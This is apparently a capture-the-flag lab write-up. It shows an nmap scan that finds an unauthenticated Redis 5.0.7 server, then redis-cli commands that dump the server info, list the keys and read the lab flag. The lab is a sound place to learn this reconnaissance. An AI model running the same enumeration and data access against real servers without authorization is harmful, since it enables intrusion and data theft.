- Here we have connected the machine with vpn using openvpn
- One the connection was established we run the ICMP echo request aka ping request to check if the machine is ruining or not.
		`ping <ip address> -c 4`
- Then run the Nmap scan
┌──(root㉿kali)-[~]
└─# nmap -T4 -Pn -A 10.129.134.5
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-24 02:18 IST
Nmap scan report for 10.129.134.5
Host is up (0.36s latency).
All 1000 scanned ports on 10.129.134.5 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   434.01 ms 10.10.16.1
2   200.92 ms 10.129.134.5

┌──(root㉿kali)-[~]
└─# nmap -T4 -p- -A 10.129.134.5
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-24 02:20 IST
Stats: 0:02:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 38.67% done; ETC: 02:26 (0:03:33 remaining)
Nmap scan report for 10.129.134.5
Host is up (0.30s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/24%OT=6379%CT=1%CU=41499%PV=Y%DS=2%DC=T%G=Y%TM=64BD9
OS:5E8%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10F%TI=Z%CI=Z%TS=A)SEQ(SP=
OS:FF%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M537ST11NW7%O2=M537ST11NW7%O
OS:3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11NW7%O6=M537ST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   262.84 ms 10.10.16.1
2   263.19 ms 10.129.134.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 830.19 seconds


Note we have to install the redis-cli in kali linux.

- Redis terminal info command
- ┌──(root㉿kali)-[~]
└─# redis-cli -h 10.129.134.5
10.129.134.5:6379> info
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:752
run_id:e62c57f370d5933c6d48b9a869ebae829cdcfbbc
tcp_port:6379
uptime_in_seconds:2360
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:12381808
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:4
client_recent_max_output_buffer:0
blocked_clients:0

# Memory
used_memory:859624
used_memory_human:839.48K
used_memory_rss:6721536
used_memory_rss_human:6.41M
used_memory_peak:859624
used_memory_peak_human:839.48K
used_memory_peak_perc:100.00%
used_memory_overhead:846142
used_memory_startup:796224
used_memory_dataset:13482
used_memory_dataset_perc:21.26%
allocator_allocated:1564792
allocator_active:1937408
allocator_resident:13385728
total_system_memory:2084024320
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.24
allocator_frag_bytes:372616
allocator_rss_ratio:6.91
allocator_rss_bytes:11448320
rss_overhead_ratio:0.50
rss_overhead_bytes:-6664192
mem_fragmentation_ratio:8.22
mem_fragmentation_bytes:5903920
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1690101949
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:0
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:409600
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:8
total_commands_processed:10
instantaneous_ops_per_sec:0
total_net_input_bytes:406
total_net_output_bytes:29836
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:256
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:945669f3a8756e4260c9369a1c0b02729a94443b
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.994891
used_cpu_user:0.986351
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000908

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
10.129.134.5:6379> 


10.129.134.5:6379> keys *
1) "temp"
2) "numb"
3) "flag"
4) "stor"
10.129.134.5:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
10.129.134.5:6379> 
